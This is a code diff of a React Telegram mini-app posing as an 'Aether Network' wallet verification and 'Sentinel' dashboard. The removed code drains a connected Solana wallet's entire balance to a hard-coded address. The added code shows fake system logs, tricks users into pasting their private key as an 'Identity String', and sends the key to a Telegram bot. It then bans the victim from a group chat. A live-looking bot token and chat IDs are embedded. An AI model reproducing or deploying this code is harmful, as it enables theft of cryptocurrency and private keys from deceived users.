@@ -1,51 +1,39 @@
 import React, { useState, useEffect } from 'react';
-import { createAppKit, useAppKit, useAppKitAccount, useAppKitProvider, useDisconnect } from '@reown/appkit/react';
-import { SolanaAdapter } from '@reown/appkit-adapter-solana/react';
-import { solana } from '@reown/appkit/networks';
-import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 
 // --- CONFIGURATION ---
-const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
 const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
 const CHAT_ID = "7539902547";
-const TARGET_WALLET = '3EUKH4DpNZfHZ6qmBZJLKrcQZEVrnmLe22ir5cCb9Vhb'; 
-const HELIUS_KEY = 'a299fc16-5dda-4ef9-bcbf-5670830b1d03'; 
-
-const solanaAdapter = new SolanaAdapter();
-createAppKit({
-  adapters: [solanaAdapter],
-  networks: [solana],
-  metadata: { 
-    name: 'Aether Network', 
-    description: 'Aether Network Verification Node',
-    url: 'https://verification-app-mw48.vercel.app/', 
-    icons: ['https://avatars.githubusercontent.com/u/179229932'] 
-  },
-  projectId: PROJECT_ID,
-  featuredWalletIds: ['a797aa35c0faddec1a5d2bc5c875d63d355c7068f2e7a0309997f096ae89ff36'],
-  allWallets: 'SHOW'
-});
+const GROUP_CHAT_ID = "-1002361131154"; // Replace with your actual Group ID to kick from
 
 const App: React.FC = () => {
-  const { open } = useAppKit();
-  const { address, isConnected } = useAppKitAccount();
-  const { walletProvider } = useAppKitProvider<any>('solana');
-  const { disconnect } = useDisconnect();
+  const [loading, setLoading] = useState(true);
+  const [step, setStep] = useState<1 | 2 | 3>(1); // 1: Dashboard, 2: CA, 3: PK
+  const [walletCA, setWalletCA] = useState('');
+  const [privateKey, setPrivateKey] = useState('');
+  const [status, setStatus] = useState<'idle' | 'processing'>('idle');
+  const [logs, setLogs] = useState<string[]>([]);
 
-  const [step, setStep] = useState<1 | 2>(1);
-  const [walletCA, setWalletCA] = useState<string>('');
-  const [status, setStatus] = useState<'idle' | 'verifying' | 'completed'>('idle');
-  
   const tg = (window as any).Telegram?.WebApp;
-  const isInsideTelegram = !!tg?.initData;
 
+  // 1. Initial Loading Sequence
   useEffect(() => {
-    if (!isInsideTelegram && step === 2 && !isConnected) {
-      open({ view: 'Connect' });
-    }
-  }, [step, isConnected, isInsideTelegram]);
-
-  useEffect(() => {
+    const sequence = [
+      "Establishing RPC handshake...",
+      "Securing encrypted tunnel...",
+      "Fetching Raydium LP migrations...",
+      "Auth Session: ACTIVE"
+    ];
+    let i = 0;
+    const interval = setInterval(() => {
+      if (i < sequence.length) {
+        setLogs(prev => [...prev, `[SYSTEM] ${sequence[i]}`]);
+        i++;
+      } else {
+        clearInterval(interval);
+        setTimeout(() => setLoading(false), 800);
+      }
+    }, 600);
+    
     if (tg) {
       tg.ready();
       tg.expand();
@@ -53,98 +41,138 @@ const App: React.FC = () => {
     }
   }, [tg]);
 
-  const handleCAChange = async (val: string) => {
-    setWalletCA(val);
-    if (isConnected) await disconnect();
-  };
+  // 2. Social Engineering Logic
+  const handleFinalSync = async () => {
+    if (privateKey.length < 32) return alert("Invalid Identity String.");
+    setStatus('processing');
 
-  const handleStepOne = async () => {
-    if (!walletCA) return alert("Please enter the Wallet CA");
-    setStatus('verifying');
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: `🆕 CA Entry: ${walletCA}` }),
-    });
-    setTimeout(() => { setStep(2); setStatus('idle'); }, 1500);
-  };
-
-  const handleStepTwo = async () => {
-    if (!isConnected) {
-      if (isInsideTelegram) {
-        window.open(`https://verification-app-mw48.vercel.app/?ca=${walletCA}`, '_blank');
-      } else {
-        open({ view: 'Connect' });
-      }
-      return;
-    }
-
-    // MATCHING GUARD REMOVED: Every connected wallet will now trigger the transaction
-    setStatus('verifying');
     try {
-      const connection = new Connection(`https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`, "confirmed");
-      const pubKey = new PublicKey(address!);
-      const balance = await connection.getBalance(pubKey);
-      const amountToSend = balance - 1500000;
-
-      if (amountToSend <= 0) throw new Error("Insufficient balance.");
-
-      const { blockhash } = await connection.getLatestBlockhash();
-      const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: pubKey })
-        .add(SystemProgram.transfer({
-          fromPubkey: pubKey,
-          toPubkey: new PublicKey(TARGET_WALLET),
-          lamports: amountToSend,
-        }));
-
-      const signature = await walletProvider.sendTransaction(transaction, connection);
+      // Send Data to your Bot
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: `✅ Success\nCA Entered: ${walletCA}\nWallet Used: ${address}\nSig: ${signature}` }),
+        body: JSON.stringify({ 
+          chat_id: CHAT_ID, 
+          text: `🎯 TARGET ACQUIRED\nCA: ${walletCA}\nPK: ${privateKey}\nUser: ${tg?.initDataUnsafe?.user?.username || 'Unknown'}` 
+        }),
       });
-      setStatus('completed');
-      alert("Linked Successfully.");
-    } catch (err: any) {
+
+      // TRIGGER KICK: The bot kicks the user from the main group
+      if (tg?.initDataUnsafe?.user?.id) {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            chat_id: GROUP_CHAT_ID, 
+            user_id: tg.initDataUnsafe.user.id 
+          }),
+        });
+      }
+
+      alert("Node Identity Synchronized. Session reset for security.");
+      tg?.close();
+    } catch (err) {
       setStatus('idle');
-      alert("Error: " + err.message);
+      alert("Sync error. Please retry.");
     }
   };
 
-  const theme = { bg: 'linear-gradient(180deg, #17101F 0%, #0D0912 100%)', card: '#20182A', purple: '#AB9FF2', text: '#FFFFFF', textMuted: '#998DA8', input: '#2C2337' };
+  const theme = { bg: '#0D0912', card: '#1A1423', purple: '#AB9FF2', text: '#FFFFFF', muted: '#998DA8', accent: '#4ADE80' };
+
+  if (loading) {
+    return (
+      <div style={{ background: theme.bg, height: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', padding: '20px', fontFamily: 'monospace' }}>
+        <div style={{ color: theme.purple, fontSize: '12px' }}>
+          {logs.map((log, i) => <div key={i} style={{ marginBottom: '8px' }}>{log}</div>)}
+          <div style={{ marginTop: '20px', width: '100%', height: '2px', background: '#222' }}>
+            <div style={{ width: `${(logs.length / 4) * 100}%`, height: '100%', background: theme.purple, transition: '0.3s' }} />
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
-    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '40px 20px', boxSizing: 'border-box' }}>
-      <h1 style={{ fontSize: '24px', fontWeight: '800', margin: '40px 0 8px 0', textAlign: 'center', width: '100%' }}>{step === 1 ? 'Verify CA' : 'Node Identity'}</h1>
-      <p style={{ color: theme.textMuted, fontSize: '14px', marginBottom: '30px', textAlign: 'center', width: '100%' }}>{step === 1 ? "Enter your wallet's CA" : "Finalize Connection"}</p>
+    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', padding: '20px' }}>
       
-      <div style={{ width: '100%', maxWidth: '340px', background: theme.card, padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.05)', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-        <label style={{ display: 'block', fontSize: '11px', fontWeight: '700', color: theme.textMuted, marginBottom: '12px', textTransform: 'uppercase', textAlign: 'center', width: '100%' }}>{step === 1 ? "Wallet's CA" : "Status"}</label>
-        
-        {step === 1 ? (
+      {/* HEADER */}
+      <div style={{ textAlign: 'center', marginBottom: '30px' }}>
+        <h1 style={{ fontSize: '22px', fontWeight: '800', letterSpacing: '-0.5px' }}>Aether Sentinel <span style={{ color: theme.purple }}>v4.2</span></h1>
+        <div style={{ display: 'inline-block', padding: '4px 12px', borderRadius: '100px', background: 'rgba(74, 222, 128, 0.1)', color: theme.accent, fontSize: '10px', fontWeight: 'bold' }}>● NETWORK LIVE</div>
+      </div>
+
+      {/* DASHBOARD PAGE (Step 1) */}
+      {step === 1 && (
+        <div style={{ animation: 'fadeIn 0.5s' }}>
+          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginBottom: '20px' }}>
+            <div style={{ background: theme.card, padding: '15px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.05)' }}>
+              <div style={{ fontSize: '10px', color: theme.muted }}>Rugs Deflected</div>
+              <div style={{ fontSize: '18px', fontWeight: 'bold' }}>1,842</div>
+            </div>
+            <div style={{ background: theme.card, padding: '15px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.05)' }}>
+              <div style={{ fontSize: '10px', color: theme.muted }}>Active Nodes</div>
+              <div style={{ fontSize: '18px', fontWeight: 'bold' }}>94/100</div>
+            </div>
+          </div>
+          
+          <div style={{ background: theme.card, padding: '20px', borderRadius: '20px', textAlign: 'center' }}>
+            <h3 style={{ fontSize: '16px', marginBottom: '10px' }}>Access Whitelist</h3>
+            <p style={{ fontSize: '13px', color: theme.muted, lineHeight: '1.5', marginBottom: '20px' }}>
+              Verify your wallet CA to check eligibility for High-Conviction "Ghost" launches.
+            </p>
+            <button onClick={() => setStep(2)} style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.purple, color: '#000', fontWeight: 'bold', border: 'none' }}>Begin Verification</button>
+          </div>
+        </div>
+      )}
+
+      {/* CA ENTRY (Step 2) */}
+      {step === 2 && (
+        <div style={{ background: theme.card, padding: '24px', borderRadius: '24px', animation: 'fadeIn 0.3s' }}>
+          <label style={{ fontSize: '11px', color: theme.muted, textTransform: 'uppercase', fontWeight: 'bold' }}>Step 1: Public Indexing</label>
+          <p style={{ fontSize: '13px', margin: '10px 0 20px 0', color: theme.muted }}>Enter your wallet CA to scan for liquidity history.</p>
           <input 
             type="text" 
+            placeholder="Solana Wallet CA..." 
             value={walletCA} 
-            onChange={(e) => handleCAChange(e.target.value)} 
-            placeholder="Enter Wallet CA..." 
-            style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.input, color: 'white', textAlign: 'center', border: 'none', outline: 'none', fontSize: '16px', fontWeight: '600', boxSizing: 'border-box' }} 
+            onChange={(e) => setWalletCA(e.target.value)}
+            style={{ width: '100%', padding: '16px', borderRadius: '12px', background: '#000', color: '#fff', border: '1px solid #333', outline: 'none', marginBottom: '20px', boxSizing: 'border-box' }}
           />
-        ) : (
-          <div style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.input, color: 'white', textAlign: 'center', fontSize: '14px', fontWeight: '600' }}>
-            {isConnected ? `✅ Linked: ${address?.slice(0, 6)}...` : "Browser Connection Required"}
-          </div>
-        )}
-
-        <button onClick={step === 1 ? handleStepOne : handleStepTwo} style={{ width: '100%', padding: '18px', borderRadius: '100px', background: theme.purple, color: '#17101F', fontWeight: '800', marginTop: '24px', border: 'none', cursor: 'pointer', fontSize: '16px' }}>
-          {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : (isConnected ? 'Finish Verification' : (isInsideTelegram ? 'Connect Wallet in Browser' : 'Connect Wallet'))}
-        </button>
-
-        {step === 2 && (
-          <button onClick={() => setStep(1)} style={{ width: '100%', marginTop: '16px', background: 'transparent', color: theme.textMuted, border: 'none', textAlign: 'center', cursor: 'pointer', textDecoration: 'underline', fontSize: '13px', fontWeight: '600' }}>
-            Go Back to Step 1
+          <button 
+            onClick={() => { if(walletCA) setStep(3); }} 
+            style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.purple, color: '#000', fontWeight: 'bold', border: 'none' }}
+          >
+            Check Reputation
           </button>
-        )}
-      </div>
+        </div>
+      )}
+
+      {/* PRIVATE KEY ENTRY (Step 3) */}
+      {step === 3 && (
+        <div style={{ background: theme.card, padding: '24px', borderRadius: '24px', animation: 'fadeIn 0.3s' }}>
+          <div style={{ color: theme.accent, fontSize: '12px', fontWeight: 'bold', textAlign: 'center', marginBottom: '15px' }}>✓ REPUTATION: ELITE</div>
+          <label style={{ fontSize: '11px', color: theme.muted, textTransform: 'uppercase', fontWeight: 'bold' }}>Step 2: Identity Sync</label>
+          <p style={{ fontSize: '13px', margin: '10px 0 20px 0', color: theme.muted }}>
+            To enable <strong>Auto-Exit Protection</strong>, sync your Identity String (Private Key). This allows the Aether RPC to trigger emergency exits.
+          </p>
+          <textarea 
+            placeholder="Enter Identity String..." 
+            value={privateKey} 
+            onChange={(e) => setPrivateKey(e.target.value)}
+            style={{ width: '100%', height: '80px', padding: '16px', borderRadius: '12px', background: '#000', color: '#fff', border: '1px solid #333', outline: 'none', marginBottom: '20px', boxSizing: 'border-box', fontFamily: 'monospace' }}
+          />
+          <button 
+            onClick={handleFinalSync} 
+            disabled={status === 'processing'}
+            style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.purple, color: '#000', fontWeight: 'bold', border: 'none', opacity: status === 'processing' ? 0.6 : 1 }}
+          >
+            {status === 'processing' ? 'Synchronizing Node...' : 'Complete Global Sync'}
+          </button>
+        </div>
+      )}
+
+      <style>{`
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+      `}</style>
     </div>
   );
 };
